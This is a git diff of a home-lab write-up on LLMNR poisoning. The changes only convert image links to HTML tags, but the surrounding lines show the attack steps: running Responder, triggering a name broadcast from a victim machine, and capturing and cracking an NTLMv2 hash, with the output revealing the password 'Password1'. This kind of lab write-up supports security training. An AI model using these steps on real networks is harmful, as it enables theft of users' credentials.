@@ -105,7 +105,7 @@ sudo responder -I eth0 -dwv
 ```
 Responder will now listen on the network and wait for someone to broadcast a name request.
 
-![Responder Output](images/step2.png)
+<img src="/writeups//01-llmnr-poisoning/images/step2.png" width="700">
 
 
 ### Step 3 — Trigger from Victim Machine
@@ -116,7 +116,7 @@ On Windows victim, open File Explorer and type:
 ```
 In my case, my victim machine name is Victim 2
 
-![Responder Output](images/step3-1.png)
+<img src="/writeups//01-llmnr-poisoning/images/step3-1.png" width="700">
 
 Windows tries DNS → fails → broadcasts LLMNR → Responder catches it.
 
@@ -128,13 +128,14 @@ Windows tries DNS → fails → broadcasts LLMNR → Responder catches it.
 [SMB] NTLMv2-SSP Username : VICTIM-2\karim
 [SMB] NTLMv2-SSP Hash     : karim::VICTIM-2:9265e4bef71c4923:19C4EB1DD7F5B53D853808B81F0EBCE4:010100000000000000CFC35AC5E6DC0135AE1EB1E9966109000000000200080036005A .... (full hash)...
 ```
-![Responder Output](images/step3-2.png)
+
+<img src="/writeups//01-llmnr-poisoning/images/step3-2.png" width="700">
 
 ### Step 4 — Capture the Hash
 
 Copy the Hash
 
-![Responder Output](images/step4-1.png)
+<img src="/writeups//01-llmnr-poisoning/images/step4-1.png" width="700">
 
 Then on attacker terminal, type
 
@@ -143,11 +144,11 @@ nano hash.txt
 ```
 Now hit Enter button
 
-![](images/step4-2.png)
+<img src="/writeups//01-llmnr-poisoning/images/step4-2.png" width="700">
 
 A nano text editor will open. Paste the Hash here.
 
-![](images/step4-3.png)
+<img src="/writeups//01-llmnr-poisoning/images/step4-3.png" width="700">
 
 Then press Ctrl+x, y, Enter
 
@@ -181,7 +182,8 @@ KARIM::VICTIM-2:08c4e1b5073681c1:7acce8f5708e0b1ea3bcbcf99f26fa01:10101000000000
 0000050006002000000000800045005300350033004a0083003......(full hash).....:Password1         
                                                                                    
 ```
-![Responder Output](images/step4-4.png)
+
+<img src="/writeups//01-llmnr-poisoning/images/step4-4.png" width="700">
 
 
 ## Defense & Mitigation
